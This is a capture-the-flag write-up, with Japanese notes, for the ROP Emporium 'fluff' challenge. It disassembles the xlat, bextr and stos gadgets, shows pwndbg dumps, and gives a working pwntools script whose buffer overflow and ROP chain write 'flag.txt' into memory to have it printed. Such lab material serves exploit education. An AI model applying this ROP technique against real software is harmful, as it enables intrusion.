# fluff (ROP Emporium 6)

## Information

### questionableGadgets
```asm
400628:	d7                   	xlat   BYTE PTR ds:[rbx] # set to AL register
400629:	c3                   	ret
40062a:	5a                   	pop    rdx
40062b:	59                   	pop    rcx
40062c:	48 81 c1 f2 3e 00 00 	add    rcx,0x3ef2
400633:	c4 e2 e8 f7 d9       	bextr  rbx,rcx,rdx
400638:	c3                   	ret
400639:	aa                   	stos   BYTE PTR es:[rdi],al
40063a:	c3                   	ret
40063b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
```

#### stos
before
```
*RAX  0xb 
*RDI  0x7f887122a710 (_IO_stdfile_1_lock) ◂— 0 
```
```
pwndbg> hexdump 0x7f887122a710
+0000 0x7f887122a710  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
```
after
```
 RAX  0xb
*RDI  0x7f887122a711 (_IO_stdfile_1_lock+1) ◂— 0
```
```
pwndbg> hexdump 0x7f887122a710
+0000 0x7f887122a710  0b 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
```

alを使って任意の領域に書き込める

alに書き込む内容が入ればよい

#### xlat
before
```
*RAX  0xb                                                    
*RBX  0x7ffe8a260e28 —▸ 0x7ffe8a263196 ◂— 0x6666756c662f2e /* './fluff' */ */                                                                   
```
```
pwndbg> hexdump 0x7ffe8a260e28
+0000 0x7ffe8a260e28  96 31 26 8a fe 7f 00 00  00 00 00 00 00 00 00 00  │.1&.....│........│
+0010 0x7ffe8a260e38  9e 31 26 8a fe 7f 00 00  b6 31 26 8a fe 7f 00 00  │.1&.....│.1&.....│
+0020 0x7ffe8a260e48  c5 31 26 8a fe 7f 00 00  d9 31 26 8a fe 7f 00 00  │.1&.....│.1&.....│
+0030 0x7ffe8a260e58  fc 31 26 8a fe 7f 00 00  32 32 26 8a fe 7f 00 00  │.1&.....│22&.....│
```
after
```
*RAX  0
 RBX  0x7ffe8a260e28 —▸ 0x7ffe8a263196 ◂— 0x6666756c662f2e /* './fluff' */
```
rbxを使ってalを任意に書き換えられる

rbxに下のuseful charのアドレスを入れたい

#### bextr
```asm
400633:	c4 e2 e8 f7 d9       	bextr  rbx,rcx,rdx
```
rcxの値をrbxにコピーできる(rdxに0b0100000000000000 = 0x4000を入れればよい)

### yoi gadget
```asm
40062a:	5a                   	pop    rdx
40062b:	59                   	pop    rcx
40062c:	48 81 c1 f2 3e 00 00 	add    rcx,0x3ef2
```

### ROPgadget
```zsh
└─$ ROPgadget --binary ./fluff | grep "pop rdi"
0x00000000004006a3 : pop rdi ; ret
```

### useful char
```
00000230  01 00 00 00 00 00 00 00  2f 6c 69 62 36 34 2f 6c  |......../lib64/l|
00000240  64 2d 6c 69 6e 75 78 2d  78 38 36 2d 36 34 2e 73  |d-linux-x86-64.s|
00000250  6f 2e 32 00 04 00 00 00  10 00 00 00 01 00 00 00  |o.2.............|

000003c0  00 6c 69 62 66 6c 75 66  66 2e 73 6f 00 5f 5f 67  |.libfluff.so.__g|
000003d0  6d 6f 6e 5f 73 74 61 72  74 5f 5f 00 70 72 69 6e  |mon_start__.prin|
000003e0  74 5f 66 69 6c 65 00 70  77 6e 6d 65 00 5f 69 6e  |t_file.pwnme._in|
000003f0  69 74 00 5f 66 69 6e 69  00 6c 69 62 63 2e 73 6f  |it._fini.libc.so|
00000400  2e 36 00 5f 5f 6c 69 62  63 5f 73 74 61 72 74 5f  |.6.__libc_start_|
00000410  6d 61 69 6e 00 5f 65 64  61 74 61 00 5f 5f 62 73  |main._edata.__bs|
00000420  73 5f 73 74 61 72 74 00  5f 65 6e 64 00 47 4c 49  |s_start._end.GLI|
00000430  42 43 5f 32 2e 32 2e 35  00 2e 00 00 00 00 00 00  |BC_2.2.5........|
```
- f: 0x4003c4
- l: 0x4003c1
- a: 0x400411
- g: 0x4003cf
- .: 0x400434
- t: 0x4003e0
- x: 0x400246
- t: 0x4003e0

## Solution
まず，1文字目の'f'を0x601028に書き込むスクリプト
1. call 0x40062a with stack: 0x4000, (0x4003c4 - 0x3ef2 - 0xb)  # rbx = 0x4003c4 - 0xb (最初はrax = 0xbのため)
2. call 0x400628
3. set rdi to 0x601028
4. call 0x400639
```python
payload = b'A'*0x28
payload += p64(0x40062a)
payload += p64(0x4000)
payload += p64(0x4003c4 - 0x3ef2 - 0xb)
payload += p64(0x400628)
payload += p64(rop.rdi.address)
payload += p64(0x601028)
payload += p64(0x400639)
```
```
pwndbg> hexdump 0x601028
+0000 0x601028  66 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │f.......│........│
+0010 0x601038  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
... ↓            skipped 1 identical lines (16 bytes)
+0030 0x601058  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
```
okok

一般化すると
1. call 0x40062a with stack: 0x4000, (【i文字目のアドレス】 - 0x3ef2 - 【i-1文字目】)  
2. call 0x400628
3. set rdi to 0x601028 + i
4. call 0x400639

### Script
```python
from pwn import *

#conn = gdb.debug('./fluff')
conn = process('./fluff')

elf = ELF('./fluff')
rop = ROP(elf)

file_name = [b'\x0b', b'f', b'l', b'a', b'g', b'.', b't', b'x', b't']
char_addr = [0x4003c4, 0x4003c1, 0x400411, 0x4003cf, 0x400434, 0x4003e0, 0x400246, 0x4003e0]

payload = b'A'*0x28

for i in range(1, len(file_name)):
    payload += p64(0x40062a)
    payload += p64(0x4000)
    payload += p64(char_addr[i-1] - 0x3ef2 - int.from_bytes(file_name[i-1], 'little'))
    payload += p64(0x400628)
    payload += p64(rop.rdi.address)
    payload += p64(0x601028 + i - 1)
    payload += p64(0x400639)

payload += p64(rop.rdi.address)
payload += p64(0x601028)
payload += p64(0x400620)

conn.sendlineafter('> ', payload)
conn.interactive()
```